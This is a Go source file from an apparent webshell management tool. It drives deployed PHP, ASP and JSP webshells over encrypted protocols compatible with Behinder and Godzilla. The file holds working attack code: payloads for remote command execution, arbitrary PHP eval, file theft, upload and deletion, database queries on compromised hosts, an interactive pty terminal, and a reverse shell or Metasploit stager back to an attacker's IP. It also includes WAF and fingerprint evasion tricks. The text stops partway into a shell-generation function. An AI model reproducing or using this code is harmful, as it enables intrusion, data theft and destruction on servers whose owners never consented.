package webshell

import (
	"bytes"
	"crypto/md5"  //nolint:gosec
	"crypto/rand" //nolint:gosec
	"encoding/base64"
	"encoding/json"
	"fmt"
	"io"
	"net/http"
	"net/http/cookiejar"
	"net/url"
	"strings"
	"sync"
	"time"
)

// Agent 与已部署的 Webshell 通信，支持 AEGIS 自研协议、冰蝎 v3/v4、哥斯拉 PHP AES。
// 响应格式（各协议统一）：JSON {"status":"200","msg":"base64(result)"}
type Agent struct {
	url           string
	key           []byte // 16字节密码派生密钥（AES-128 协议用）
	key32         []byte // 32字节密码派生密钥（AES-256-GCM 协议用）
	godzillaKey   []byte // 哥斯拉 AES key（godzilla_php_aes 协议专用：MD5(strrev(MD5(pass)))[0:16]）
	protocol      string // behinder_v3 | behinder_v4 | godzilla_php_aes | default_aes | default_xor | default_xor_base64 | default_image | default_json | aes_with_magic | aes_gcm
	shellType     string // php | asp | jsp | aspx
	customHeaders map[string]string // 用户自定义 HTTP 请求头（每次请求都附带）
	client        *http.Client

	// behinder_v3/v4 会话密钥（握手后赋值）
	v3Mu    sync.Mutex
	v3Key   []byte
	v3Ready bool
}

// parseCustomHeaders 解析 "Key: Value" 格式的多行请求头文本。
func parseCustomHeaders(raw string) map[string]string {
	m := make(map[string]string)
	for _, line := range strings.Split(raw, "\n") {
		line = strings.TrimSpace(line)
		if line == "" || strings.HasPrefix(line, "#") {
			continue
		}
		idx := strings.IndexByte(line, ':')
		if idx <= 0 {
			continue
		}
		k := strings.TrimSpace(line[:idx])
		v := strings.TrimSpace(line[idx+1:])
		if k != "" {
			m[k] = v
		}
	}
	return m
}

// applyHeaders 将自定义请求头附加到请求（会覆盖同名默认头）。
func (a *Agent) applyHeaders(req *http.Request) {
	for k, v := range a.customHeaders {
		req.Header.Set(k, v)
	}
}

// deriveKey 从密码派生 16 字节 AES 密钥（与冰蝎默认密码派生方式一致）。
func deriveKey(password string) string {
	h := md5.Sum([]byte(password)) //nolint:gosec
	return fmt.Sprintf("%x", h)[:16]
}

// deriveKey32 从密码派生 32 字节 AES-256 密钥。
// 算法：取 MD5(password) 的前 16 个 hex 字符，重复两次拼成 32 字节。
// PHP 侧对应：$k16=substr(md5($pass),0,16); $k32=$k16.$k16;
func deriveKey32(password string) []byte {
	k16 := deriveKey(password) // 16-char string
	return []byte(k16 + k16)  // 32 bytes
}

// deriveKeyGodzilla 哥斯拉 PHP-AES 密钥派生：key16 = MD5(strrev(MD5(password)))[0:16]
// 与哥斯拉 v4 PHP shell 内嵌的 $key=substr(md5(strrev($pass)),0,16) 完全一致。
func deriveKeyGodzilla(password string) []byte {
	h1 := fmt.Sprintf("%x", md5.Sum([]byte(password))) //nolint:gosec
	// 翻转 MD5 hex 字符串
	r := []byte(h1)
	for i, j := 0, len(r)-1; i < j; i, j = i+1, j-1 {
		r[i], r[j] = r[j], r[i]
	}
	h2 := fmt.Sprintf("%x", md5.Sum(r)) //nolint:gosec
	return []byte(h2[:16])
}

func newAgent(agentURL, password, protocol, customHeadersRaw, shellType string) *Agent {
	if protocol == "" {
		protocol = "default_aes"
	}
	if shellType == "" {
		shellType = "php"
	}
	jar, _ := cookiejar.New(nil)
	a := &Agent{
		url:           agentURL,
		key:           []byte(deriveKey(password)),
		key32:         deriveKey32(password),
		protocol:      protocol,
		shellType:     shellType,
		customHeaders: parseCustomHeaders(customHeadersRaw),
		client: &http.Client{
			Jar:     jar,
			Timeout: 15 * time.Second,
			CheckRedirect: func(req *http.Request, via []*http.Request) error {
				if len(via) >= 3 {
					return fmt.Errorf("too many redirects")
				}
				return nil
			},
		},
	}
	if strings.HasPrefix(protocol, "godzilla_") {
		a.godzillaKey = deriveKeyGodzilla(password)
	}
	return a
}

// v3Handshake 与冰蝎 v3.0 内置模式 Shell 进行会话密钥交换（只执行一次）。
// Shell 收到第一个 GET 请求时生成随机16位密钥，存入 $_SESSION['k'] 并返回密钥明文。
func (a *Agent) v3Handshake() error {
	a.v3Mu.Lock()
	defer a.v3Mu.Unlock()
	if a.v3Ready {
		return nil
	}
	handshakeReq, err := http.NewRequest("GET", a.url, nil)
	if err != nil {
		return fmt.Errorf("v3 握手请求创建失败: %w", err)
	}
	a.applyHeaders(handshakeReq)
	resp, err := a.client.Do(handshakeReq)
	if err != nil {
		return fmt.Errorf("v3 握手连接失败: %w", err)
	}
	defer resp.Body.Close()
	raw, err := io.ReadAll(io.LimitReader(resp.Body, 64))
	if err != nil {
		return fmt.Errorf("v3 握手读取失败: %w", err)
	}
	key := strings.TrimSpace(string(raw))
	if len(key) != 16 {
		return fmt.Errorf("v3 握手响应无效（期望16字节密钥，收到 %d 字节: %q）", len(key), key)
	}
	a.v3Key = []byte(key)
	a.v3Ready = true
	return nil
}

// ResetV3Session 重置 v3.0 会话，下次 send 时将重新握手（PHP Session 过期后调用）。
func (a *Agent) ResetV3Session() {
	a.v3Mu.Lock()
	a.v3Key = nil
	a.v3Ready = false
	a.v3Mu.Unlock()
}

// encodePayload 根据协议将 PHP 代码编码为 POST 请求体，返回 (body字节, Content-Type, error)。
func (a *Agent) encodePayload(payload []byte) ([]byte, string, error) {
	const ct = "application/x-www-form-urlencoded"
	switch a.protocol {
	case "behinder_v3":
		// 使用握手协商的会话密钥加密，格式与 default_aes 相同
		a.v3Mu.Lock()
		key := a.v3Key
		a.v3Mu.Unlock()
		if len(key) == 0 {
			return nil, "", fmt.Errorf("v3 会话密钥为空，请先握手")
		}
		enc, err := aes128ECBEncrypt(key, payload)
		if err != nil {
			return nil, "", err
		}
		return []byte(base64.StdEncoding.EncodeToString(enc)), ct, nil

	case "default_xor":
		// 原始 XOR 字节流，无 base64
		return xorCrypt(a.key, payload), ct, nil

	case "default_xor_base64":
		// XOR 后 base64 编码
		return []byte(base64.StdEncoding.EncodeToString(xorCrypt(a.key, payload))), ct, nil

	case "default_image":
		// PNG 魔术头 (8字节) + base64(AES(payload))，绕过 WAF 图片检测
		enc, err := aes128ECBEncrypt(a.key, payload)
		if err != nil {
			return nil, "", err
		}
		pngHdr := []byte{0x89, 0x50, 0x4E, 0x47, 0x0D, 0x0A, 0x1A, 0x0A}
		return append(pngHdr, []byte(base64.StdEncoding.EncodeToString(enc))...), ct, nil

	case "default_json":
		// JSON 包裹：{"pass":"base64(AES(payload))"}
		enc, err := aes128ECBEncrypt(a.key, payload)
		if err != nil {
			return nil, "", err
		}
		body := `{"pass":"` + base64.StdEncoding.EncodeToString(enc) + `"}`
		return []byte(body), "application/json", nil

	case "aes_with_magic":
		// 16字节随机魔法前缀 + base64(AES(payload))，每次请求前缀不同
		enc, err := aes128ECBEncrypt(a.key, payload)
		if err != nil {
			return nil, "", err
		}
		magic := make([]byte, 16)
		if _, rerr := rand.Read(magic); rerr != nil { //nolint:gosec
			return nil, "", fmt.Errorf("生成随机前缀失败: %w", rerr)
		}
		return append(magic, []byte(base64.StdEncoding.EncodeToString(enc))...), ct, nil

	case "aes_gcm":
		// AES-256-GCM：随机 nonce + 带完整性校验的密文，彻底消除 ECB 流量统计特征。
		// 格式：base64(nonce[12] || ciphertext || tag[16])
		enc, err := aes256GCMEncrypt(a.key32, payload)
		if err != nil {
			return nil, "", err
		}
		return []byte(base64.StdEncoding.EncodeToString(enc)), ct, nil

	case "default_aes_form":
		// 表单包装模式：密文包在 _=<base64> 中，看起来像普通 AJAX POST，需配套表单 PHP shell。
		enc, err := aes128ECBEncrypt(a.key, payload)
		if err != nil {
			return nil, "", err
		}
		b64 := base64.StdEncoding.EncodeToString(enc)
		return []byte(wrapBodyAsForm(b64)), ct, nil

	case "godzilla_php_aes":
		// 哥斯拉 PHP AES 协议：md5(key+key)[32字节 hex 校验] + base64(AES-128-ECB(key, payload))
		// 与哥斯拉 v4 客户端发出的请求格式完全兼容，可直连哥斯拉部署的 PHP shell。
		keyStr := string(a.godzillaKey)
		checksum := fmt.Sprintf("%x", md5.Sum([]byte(keyStr+keyStr))) //nolint:gosec
		enc, err := aes128ECBEncrypt(a.godzillaKey, payload)
		if err != nil {
			return nil, "", err
		}
		return []byte(checksum + base64.StdEncoding.EncodeToString(enc)), ct, nil

	case "behinder_v4":
		// 冰蝎 v4 真实协议：POST form 表单，参数名 = 会话密钥值，参数值 = base64(AES-128-ECB(key, payload))
		// 与冰蝎 v4 客户端的 $_POST[$k] 接收方式完全兼容，可直连冰蝎 v4 部署的 PHP shell。
		a.v3Mu.Lock()
		key := a.v3Key
		a.v3Mu.Unlock()
		if len(key) == 0 {
			return nil, "", fmt.Errorf("behinder v4 会话密钥为空，请先握手")
		}
		enc, err := aes128ECBEncrypt(key, payload)
		if err != nil {
			return nil, "", err
		}
		encB64 := base64.StdEncoding.EncodeToString(enc)
		body := url.QueryEscape(string(key)) + "=" + url.QueryEscape(encB64)
		return []byte(body), ct, nil

	default: // default_aes
		enc, err := aes128ECBEncrypt(a.key, payload)
		if err != nil {
			return nil, "", err
		}
		return []byte(base64.StdEncoding.EncodeToString(enc)), ct, nil
	}
}

// send 按当前协议加密 PHP 代码后 POST 到 shell，返回解析好的 JSON 结果。
func (a *Agent) send(phpCode string) (map[string]any, error) {
	// 冰蝎模式：发送前先完成会话密钥握手（幂等，只执行一次）
	if a.protocol == "behinder_v3" || a.protocol == "behinder_v4" {
		if err := a.v3Handshake(); err != nil {
			return nil, err
		}
	}
	body, contentType, err := a.encodePayload([]byte(phpCode))
	if err != nil {
		return nil, fmt.Errorf("加密失败: %w", err)
	}

	req, err := http.NewRequest("POST", addNoisyParam(a.url), bytes.NewReader(body))
	if err != nil {
		return nil, err
	}
	req.Header.Set("Content-Type", contentType)
	applyStealthHeaders(req)  // 随机化 UA、Accept、Referer 等，降低流量指纹可识别性
	a.applyHeaders(req)       // 自定义请求头（可覆盖 stealth 默认值）

	resp, err := a.client.Do(req)
	if err != nil {
		return nil, fmt.Errorf("连接失败: %w", err)
	}
	defer resp.Body.Close()

	raw, err := io.ReadAll(io.LimitReader(resp.Body, 4<<20))
	if err != nil {
		return nil, err
	}

	var result map[string]any
	if err := json.Unmarshal(raw, &result); err != nil {
		preview := raw
		if len(preview) > 256 {
			preview = preview[:256]
		}
		return nil, fmt.Errorf("响应解析失败（非 JSON）: %s", preview)
	}

	if status, _ := result["status"].(string); status != "200" {
		if msg, _ := result["msg"].(string); msg != "" {
			if d, e := base64.StdEncoding.DecodeString(msg); e == nil {
				return nil, fmt.Errorf("shell 执行错误: %s", d)
			}
		}
		return nil, fmt.Errorf("shell 返回非成功状态: %s", status)
	}
	return result, nil
}

// decodeMsg 解码响应中的 base64 msg 字段。
func decodeMsg(result map[string]any) ([]byte, error) {
	msg, _ := result["msg"].(string)
	return base64.StdEncoding.DecodeString(msg)
}

// SysInfo 目标服务器系统信息。
type SysInfo struct {
	OS       string `json:"os"`
	Server   string `json:"server"`
	PHP      string `json:"php"`
	CWD      string `json:"cwd"`
	User     string `json:"user"`
	Hostname string `json:"hostname"`
	IP       string `json:"ip"`
}

func (a *Agent) GetInfo() (*SysInfo, error) {
	switch a.shellType {
	case "asp":
		return a.aspGetInfo()
	case "jsp", "aspx", "python":
		return a.jspGetInfo()
	}
	code := `$i=['os'=>PHP_OS,'server'=>$_SERVER['SERVER_SOFTWARE']??'','php'=>phpversion(),'cwd'=>@getcwd(),'user'=>@get_current_user(),'hostname'=>@gethostname(),'ip'=>$_SERVER['SERVER_ADDR']??''];echo json_encode(['status'=>'200','msg'=>base64_encode(json_encode($i))]);`
	result, err := a.send(code)
	if err != nil {
		return nil, err
	}
	raw, err := decodeMsg(result)
	if err != nil {
		return nil, err
	}
	var info SysInfo
	if err := json.Unmarshal(raw, &info); err != nil {
		return nil, err
	}
	return &info, nil
}

// Exec 在目标上执行系统命令，返回输出字符串。
func (a *Agent) Exec(cmd string) (string, error) {
	switch a.shellType {
	case "asp":
		return a.aspExec(cmd)
	case "jsp", "aspx", "python":
		return a.jspExec(cmd)
	}
	// base64 编码命令，避免引号/特殊字符转义问题
	cmdB64 := base64.StdEncoding.EncodeToString([]byte(cmd))
	code := `function r($c){if(function_exists('system')){ob_start();system($c);$o=ob_get_clean();if($o!==false)return $o;}if(function_exists('shell_exec')){$o=shell_exec($c);if($o!==null)return $o;}if(function_exists('exec')){exec($c,$o);return implode("\n",$o);}if(function_exists('passthru')){ob_start();passthru($c);return ob_get_clean();}return 'no exec function available';}` +
		`$c=base64_decode('` + cmdB64 + `');$r=r($c);echo json_encode(['status'=>'200','msg'=>base64_encode($r??'')]);`
	result, err := a.send(code)
	if err != nil {
		return "", err
	}
	raw, err := decodeMsg(result)
	if err != nil {
		return "", err
	}
	return string(raw), nil
}

// FileEntry 目标服务器上的文件系统条目。
type FileEntry struct {
	Name  string `json:"name"`
	IsDir bool   `json:"isDir"`
	Size  int64  `json:"size"`
	Mtime int64  `json:"mtime"`
	Perms string `json:"perms"`
}

func (a *Agent) ListDir(path string) ([]FileEntry, error) {
	switch a.shellType {
	case "asp":
		return a.aspListDir(path)
	case "jsp", "aspx", "python":
		return a.jspListDir(path)
	}
	pathB64 := base64.StdEncoding.EncodeToString([]byte(path))
	code := `$p=base64_decode('` + pathB64 + `');$files=[];foreach(@scandir($p)?:[] as $f){if($f=='.'||$f=='..')continue;$fp=rtrim($p,'/').'/'.$f;$s=@stat($fp);$files[]=['name'=>$f,'isDir'=>is_dir($fp),'size'=>$s?$s['size']:0,'mtime'=>$s?$s['mtime']:0,'perms'=>substr(sprintf('%o',@fileperms($fp)),-4)];}echo json_encode(['status'=>'200','msg'=>base64_encode(json_encode($files))]);`
	result, err := a.send(code)
	if err != nil {
		return nil, err
	}
	raw, err := decodeMsg(result)
	if err != nil {
		return nil, err
	}
	var files []FileEntry
	if err := json.Unmarshal(raw, &files); err != nil {
		return nil, err
	}
	return files, nil
}

func (a *Agent) ReadFile(path string) ([]byte, error) {
	if a.shellType == "asp" {
		return a.aspReadFile(path)
	}
	if a.shellType == "jsp" || a.shellType == "aspx" || a.shellType == "python" {
		return a.jspReadFile(path)
	}
	pathB64 := base64.StdEncoding.EncodeToString([]byte(path))
	code := `$p=base64_decode('` + pathB64 + `');$c=@file_get_contents($p);echo json_encode(['status'=>'200','msg'=>base64_encode($c!==false?$c:'')]);`
	result, err := a.send(code)
	if err != nil {
		return nil, err
	}
	return decodeMsg(result)
}

func (a *Agent) WriteFile(path string, content []byte) error {
	if a.shellType == "asp" {
		return a.aspWriteFile(path, content)
	}
	if a.shellType == "jsp" || a.shellType == "aspx" || a.shellType == "python" {
		return a.jspWriteFile(path, content)
	}
	pathB64 := base64.StdEncoding.EncodeToString([]byte(path))
	contentB64 := base64.StdEncoding.EncodeToString(content)
	code := `$p=base64_decode('` + pathB64 + `');@file_put_contents($p,base64_decode('` + contentB64 + `'));echo json_encode(['status'=>'200','msg'=>base64_encode('ok')]);`
	_, err := a.send(code)
	return err
}

func (a *Agent) DeletePath(path string) error {
	if a.shellType == "asp" {
		return a.aspDeletePath(path)
	}
	if a.shellType == "jsp" || a.shellType == "aspx" || a.shellType == "python" {
		return a.jspDeletePath(path)
	}
	pathB64 := base64.StdEncoding.EncodeToString([]byte(path))
	code := `function rm($p){if(is_dir($p)){foreach(@scandir($p)?:[] as $f){if($f!='.'&&$f!='..')rm($p.'/'.$f);}@rmdir($p);}else @unlink($p);}rm(base64_decode('` + pathB64 + `'));echo json_encode(['status'=>'200','msg'=>base64_encode('ok')]);`
	_, err := a.send(code)
	return err
}

// RenameFile 重命名文件或目录。
func (a *Agent) RenameFile(oldPath, newPath string) error {
	if a.shellType == "asp" {
		return a.aspRenameFile(oldPath, newPath)
	}
	if a.shellType == "jsp" || a.shellType == "aspx" || a.shellType == "python" {
		return a.jspRenameFile(oldPath, newPath)
	}
	ob := base64.StdEncoding.EncodeToString([]byte(oldPath))
	nb := base64.StdEncoding.EncodeToString([]byte(newPath))
	code := `$o=base64_decode('` + ob + `');$n=base64_decode('` + nb + `');$r=@rename($o,$n);echo json_encode(['status'=>'200','msg'=>base64_encode($r?'ok':'fail')]);`
	_, err := a.send(code)
	return err
}

// MkDir 在目标上创建目录（递归）。
func (a *Agent) MkDir(path string) error {
	if a.shellType == "asp" {
		return a.aspMkDir(path)
	}
	if a.shellType == "jsp" || a.shellType == "aspx" || a.shellType == "python" {
		return a.jspMkDir(path)
	}
	pathB64 := base64.StdEncoding.EncodeToString([]byte(path))
	code := `$p=base64_decode('` + pathB64 + `');@mkdir($p,0755,true);echo json_encode(['status'=>'200','msg'=>base64_encode('ok')]);`
	_, err := a.send(code)
	return err
}

// DownloadFile 下载目标文件，返回原始字节。
func (a *Agent) DownloadFile(path string) ([]byte, error) {
	if a.shellType == "asp" {
		return a.aspReadFile(path)
	}
	if a.shellType == "jsp" || a.shellType == "aspx" || a.shellType == "python" {
		return a.jspReadFile(path)
	}
	pathB64 := base64.StdEncoding.EncodeToString([]byte(path))
	code := `$p=base64_decode('` + pathB64 + `');$c=@file_get_contents($p);if($c===false){echo json_encode(['status'=>'200','msg'=>base64_encode('')]);}else{echo json_encode(['status'=>'200','msg'=>base64_encode($c)]);}`
	result, err := a.send(code)
	if err != nil {
		return nil, err
	}
	return decodeMsg(result)
}

// UploadFile 上传文件（content 为原始字节）。
func (a *Agent) UploadFile(path string, content []byte) error {
	return a.WriteFile(path, content)
}

// GetFileHash 返回目标文件的 MD5 值。
func (a *Agent) GetFileHash(path string) (string, error) {
	if a.shellType == "jsp" || a.shellType == "aspx" || a.shellType == "python" {
		return a.jspGetFileHash(path)
	}
	pathB64 := base64.StdEncoding.EncodeToString([]byte(path))
	code := `$p=base64_decode('` + pathB64 + `');$h=@md5_file($p);echo json_encode(['status'=>'200','msg'=>base64_encode($h!==false?$h:'')]);`
	result, err := a.send(code)
	if err != nil {
		return "", err
	}
	raw, err := decodeMsg(result)
	return string(raw), err
}

// Eval 在目标执行任意 PHP 代码，返回 stdout 输出。仅 PHP shell 支持。
func (a *Agent) Eval(phpCode string) (string, error) {
	if a.shellType == "jsp" || a.shellType == "aspx" || a.shellType == "python" {
		return "", errJSPNotSupported(a.shellType, "eval")
	}
	codeB64 := base64.StdEncoding.EncodeToString([]byte(phpCode))
	code := `ob_start();eval(base64_decode('` + codeB64 + `'));$out=ob_get_clean();echo json_encode(['status'=>'200','msg'=>base64_encode($out!==false?$out:'')]);`
	result, err := a.send(code)
	if err != nil {
		return "", err
	}
	raw, err := decodeMsg(result)
	return string(raw), err
}

// RealCMDCreate 启动交互式终端（通过 PHP session + proc_open）。
// 该调用会立即返回 ok，PHP 进程在后台继续运行。
func (a *Agent) RealCMDCreate(shell string) error {
	shellB64 := base64.StdEncoding.EncodeToString([]byte(shell))
	code := "@error_reporting(0);\n" +
		"@set_time_limit(0);\n" +
		"@ignore_user_abort(1);\n" +
		"@ini_set('max_execution_time',0);\n" +
		"@session_start();\n" +
		"$_SESSION['readBuffer']='';\n" +
		"$_SESSION['writeBuffer']='';\n" +
		"$_SESSION['run']=true;\n" +
		"session_write_close();\n" +
		"@ob_end_clean();\n" +
		"$resp=json_encode(['status'=>'200','msg'=>base64_encode('ok')]);\n" +
		"header('Content-Type: application/json');\n" +
		"header('Connection: close');\n" +
		"header('Content-Length: '.strlen($resp));\n" +
		"echo $resp;\n" +
		"flush();\n" +
		"$bash=base64_decode('" + shellB64 + "');\n" +
		"$win=FALSE!==strpos(strtolower(PHP_OS),'win');\n" +
		"$desc=[0=>['pipe','r'],1=>['pipe','w'],2=>['pipe','w']];\n" +
		"$env=['TERM'=>'xterm'];\n" +
		"$proc=proc_open($bash,$desc,$pipes,null,$win?null:$env);\n" +
		"if(!is_resource($proc))exit(1);\n" +
		"stream_set_blocking($pipes[0],0);\n" +
		"stream_set_blocking($pipes[1],0);\n" +
		"stream_set_blocking($pipes[2],0);\n" +
		"if(!$win){fwrite($pipes[0],sprintf(\"python3 -c 'import pty;pty.spawn(\\\"%s\\\")'\n\",$bash));fflush($pipes[0]);}\n" +
		"sleep(1);\n" +
		"$idle=0;\n" +
		"while(true){\n" +
		"  @session_start();\n" +
		"  $run=isset($_SESSION['run'])?$_SESSION['run']:true;\n" +
		"  $wb=isset($_SESSION['writeBuffer'])?$_SESSION['writeBuffer']:'';\n" +
		"  if(strlen($wb)>0){fwrite($pipes[0],$wb);fflush($pipes[0]);$_SESSION['writeBuffer']='';$idle=0;}else{$idle++;}\n" +
		"  session_write_close();\n" +
		"  if(!$run||$idle>600)break;\n" +
		"  $out='';while(($r=@fread($pipes[1],4096))!==false&&$r!=='')$out.=$r;\n" +
		"  $err='';while(($r=@fread($pipes[2],4096))!==false&&$r!=='')$err.=$r;\n" +
		"  $combined=$out.$err;\n" +
		"  if($combined!==''){@session_start();$_SESSION['readBuffer']=(isset($_SESSION['readBuffer'])?$_SESSION['readBuffer']:'').$combined;session_write_close();$idle=0;}\n" +
		"  usleep(200000);\n" +
		"}\n" +
		"fclose($pipes[0]);fclose($pipes[1]);fclose($pipes[2]);proc_close($proc);\n"
	_, err := a.send(code)
	return err
}

// RealCMDRead 读取交互式终端缓冲输出。
func (a *Agent) RealCMDRead() (string, error) {
	code := `@session_start();$buf=isset($_SESSION['readBuffer'])?$_SESSION['readBuffer']:'';$_SESSION['readBuffer']='';session_write_close();echo json_encode(['status'=>'200','msg'=>base64_encode($buf)]);`
	result, err := a.send(code)
	if err != nil {
		return "", err
	}
	raw, err := decodeMsg(result)
	return string(raw), err
}

// RealCMDWrite 向交互式终端写入命令。
func (a *Agent) RealCMDWrite(cmd string) error {
	cmdB64 := base64.StdEncoding.EncodeToString([]byte(cmd))
	code := `@session_start();$_SESSION['writeBuffer']=base64_decode('` + cmdB64 + `');session_write_close();echo json_encode(['status'=>'200','msg'=>base64_encode('ok')]);`
	_, err := a.send(code)
	return err
}

// RealCMDStop 停止交互式终端。
func (a *Agent) RealCMDStop() error {
	code := `@session_start();$_SESSION['run']=false;$_SESSION['writeBuffer']='';session_write_close();echo json_encode(['status'=>'200','msg'=>base64_encode('ok')]);`
	_, err := a.send(code)
	return err
}

// DBResult 数据库查询结果。
type DBResult struct {
	Headers []string   `json:"headers"`
	Rows    [][]string `json:"rows"`
}

// DBQuery 在目标执行数据库查询，支持 mysql/sqlite/postgresql/sqlserver/oracle。
func (a *Agent) DBQuery(dbType, host, port, user, pass, database, sql string) (*DBResult, error) {
	typeB64 := base64.StdEncoding.EncodeToString([]byte(dbType))
	hostB64 := base64.StdEncoding.EncodeToString([]byte(host))
	portB64 := base64.StdEncoding.EncodeToString([]byte(port))
	userB64 := base64.StdEncoding.EncodeToString([]byte(user))
	passB64 := base64.StdEncoding.EncodeToString([]byte(pass))
	dbB64 := base64.StdEncoding.EncodeToString([]byte(database))
	sqlB64 := base64.StdEncoding.EncodeToString([]byte(sql))

	code := "$type=base64_decode('" + typeB64 + "');" +
		"$host=base64_decode('" + hostB64 + "');" +
		"$port=base64_decode('" + portB64 + "');" +
		"$user=base64_decode('" + userB64 + "');" +
		"$pass=base64_decode('" + passB64 + "');" +
		"$db=base64_decode('" + dbB64 + "');" +
		"$sql=base64_decode('" + sqlB64 + "');" +
		`$headers=[];$rows=[];$err='';
function dbRows($stmt,$type){
  $h=[];$r=[];
  if($type=='pdo'){
    $c=$stmt->columnCount();
    for($i=0;$i<$c;$i++){$m=$stmt->getColumnMeta($i);$h[]=$m['name'];}
    while($row=$stmt->fetch(PDO::FETCH_NUM)){$r[]=$row;}
  } elseif($type=='mysqli'){
    $fds=$stmt->fetch_fields();foreach($fds as $f)$h[]=$f->name;
    while($row=$stmt->fetch_row())$r[]=$row;
  }
  return ['h'=>$h,'r'=>$r];
}
try{
  if($type=='mysql'){
    if(function_exists('mysqli_connect')){
      $c=new mysqli($host,$user,$pass,$db,(int)$port);
      if($c->connect_error)throw new Exception($c->connect_error);
      $c->set_charset('utf8');
      $res=$c->query($sql);
      if($res===false)throw new Exception($c->error);
      if($res===true){$rows=[];$headers=['affected_rows'];$rows=[[(string)$c->affected_rows]];}
      else{$x=dbRows($res,'mysqli');$headers=$x['h'];$rows=$x['r'];}
      $c->close();
    }else{throw new Exception('No MySQLi');}
  } elseif($type=='sqlite'){
    $pdo=new PDO('sqlite:'.$db);$pdo->setAttribute(PDO::ATTR_ERRMODE,PDO::ERRMODE_EXCEPTION);
    $stmt=$pdo->query($sql);$x=dbRows($stmt,'pdo');$headers=$x['h'];$rows=$x['r'];
  } elseif($type=='postgresql'){
    $dsn='pgsql:host='.$host.';port='.$port.';dbname='.$db;
    $pdo=new PDO($dsn,$user,$pass);$pdo->setAttribute(PDO::ATTR_ERRMODE,PDO::ERRMODE_EXCEPTION);
    $stmt=$pdo->query($sql);$x=dbRows($stmt,'pdo');$headers=$x['h'];$rows=$x['r'];
  } elseif($type=='sqlserver'){
    if(function_exists('sqlsrv_connect')){
      $conn=sqlsrv_connect($host.','.$port,['Database'=>$db,'UID'=>$user,'PWD'=>$pass]);
      if(!$conn)throw new Exception(print_r(sqlsrv_errors(),true));
      $stmt=sqlsrv_query($conn,$sql);
      $fds=sqlsrv_field_metadata($stmt);foreach($fds as $f)$headers[]=$f['Name'];
      while($row=sqlsrv_fetch_array($stmt,SQLSRV_FETCH_NUMERIC))$rows[]=$row;
      sqlsrv_close($conn);
    }else{
      $dsn='sqlsrv:Server='.$host.','.$port.';Database='.$db;
      $pdo=new PDO($dsn,$user,$pass);$pdo->setAttribute(PDO::ATTR_ERRMODE,PDO::ERRMODE_EXCEPTION);
      $stmt=$pdo->query($sql);$x=dbRows($stmt,'pdo');$headers=$x['h'];$rows=$x['r'];
    }
  } elseif($type=='oracle'){
    if(function_exists('oci_connect')){
      $tns='(DESCRIPTION=(ADDRESS=(PROTOCOL=TCP)(HOST='.$host.')(PORT='.$port.'))(CONNECT_DATA=(SID='.$db.')))';
      $conn=oci_connect($user,$pass,$tns);
      if(!$conn)throw new Exception(print_r(oci_error(),true));
      $stmt=oci_parse($conn,$sql);oci_execute($stmt);
      $nc=oci_num_fields($stmt);
      for($i=1;$i<=$nc;$i++)$headers[]=oci_field_name($stmt,$i);
      while($row=oci_fetch_row($stmt))$rows[]=$row;
      oci_close($conn);
    }else{throw new Exception('No OCI');}
  }
  $result=['status'=>'success','headers'=>$headers,'rows'=>$rows];
}catch(Exception $e){$result=['status'=>'fail','error'=>$e->getMessage()];}
$rows_str=[];
foreach($rows as $row){$rs=[];foreach($row as $v)$rs[]=(string)$v;$rows_str[]=$rs;}
$result['rows']=$rows_str;
echo json_encode(['status'=>'200','msg'=>base64_encode(json_encode($result))]);`

	result, err := a.send(code)
	if err != nil {
		return nil, err
	}
	raw, err := decodeMsg(result)
	if err != nil {
		return nil, err
	}

	var res struct {
		Status  string     `json:"status"`
		Error   string     `json:"error"`
		Headers []string   `json:"headers"`
		Rows    [][]string `json:"rows"`
	}
	if err := json.Unmarshal(raw, &res); err != nil {
		return nil, fmt.Errorf("数据库结果解析失败: %s", string(raw))
	}
	if res.Status != "success" {
		return nil, fmt.Errorf("数据库错误: %s", res.Error)
	}
	if res.Rows == nil {
		res.Rows = [][]string{}
	}
	return &DBResult{Headers: res.Headers, Rows: res.Rows}, nil
}

// ConnectBack 让目标主机反弹 shell 到指定 IP:Port。
// cbType: "shell"（普通 TCP 反弹 shell）或 "meter"（Metasploit payload）
func (a *Agent) ConnectBack(cbType, ip, port string) error {
	typeB64 := base64.StdEncoding.EncodeToString([]byte(cbType))
	ipB64 := base64.StdEncoding.EncodeToString([]byte(ip))
	portStr := base64.StdEncoding.EncodeToString([]byte(port))
	code := "@error_reporting(0);\n" +
		"@set_time_limit(0);\n" +
		"@ignore_user_abort(1);\n" +
		"@ob_end_clean();\n" +
		"$resp=json_encode(['status'=>'200','msg'=>base64_encode('ok')]);\n" +
		"header('Content-Type: application/json');\n" +
		"header('Connection: close');\n" +
		"header('Content-Length: '.strlen($resp));\n" +
		"echo $resp;\n" +
		"flush();\n" +
		"$type=base64_decode('" + typeB64 + "');\n" +
		"$ip=base64_decode('" + ipB64 + "');\n" +
		"$port=(int)base64_decode('" + portStr + "');\n" +
		`if($type=='meter'){
  if(($f='stream_socket_client')&&is_callable($f)){$s=$f("tcp://{$ip}:{$port}");}
  if(!$s&&($f='fsockopen')&&is_callable($f)){$s=$f($ip,$port);}
  if(!$s)exit(0);
  $len=fread($s,4);if(!$len)exit(0);
  $a=unpack("Nlen",$len);$len=$a['len'];$b='';
  while(strlen($b)<$len)$b.=fread($s,$len-strlen($b));
  $GLOBALS['msgsock']=$s;eval($b);
}else{
  $dis=@ini_get('disable_functions');
  $dis=$dis?explode(',',preg_replace('/[, ]+/',',',$dis)):[];
  function runCmd($c){global $dis;$c=PHP_OS=='Linux'?$c.' 2>&1':$c.' 2>&1';
    if(is_callable('popen')&&!in_array('popen',$dis)){$fp=popen($c,'r');$o='';while(!feof($fp))$o.=fread($fp,1024);pclose($fp);return $o;}
    if(is_callable('exec')&&!in_array('exec',$dis)){exec($c,$o);return join("\n",$o);}
    if(is_callable('shell_exec')&&!in_array('shell_exec',$dis))return shell_exec($c);
    return '';}
  $s=@fsockopen("tcp://{$ip}",$port);
  if(!$s){$s=@socket_create(AF_INET,SOCK_STREAM,SOL_TCP);@socket_connect($s,$ip,$port);}
  while($c=fread($s,2048)){
    if(substr($c,0,3)=='cd '){chdir(substr($c,3,-1));}
    elseif(substr($c,0,4)=='quit'||substr($c,0,4)=='exit'){break;}
    else{fwrite($s,runCmd(substr($c,0,-1)));}
  }
  fclose($s);
}` + "\n"
	_, err := a.send(code)
	return err
}

// ─── Shell 代码生成 ────────────────────────────────────────────────────────────

// ShellCode 根据 shell 类型、密码、传输协议生成可部署的 webshell 代码。
// protocol 取值：behinder_v3 | behinder_v4 | godzilla_php_aes | default_aes | default_xor | ...
func ShellCode(shellType, password, protocol string) string {
	key16 := deriveKey(password)
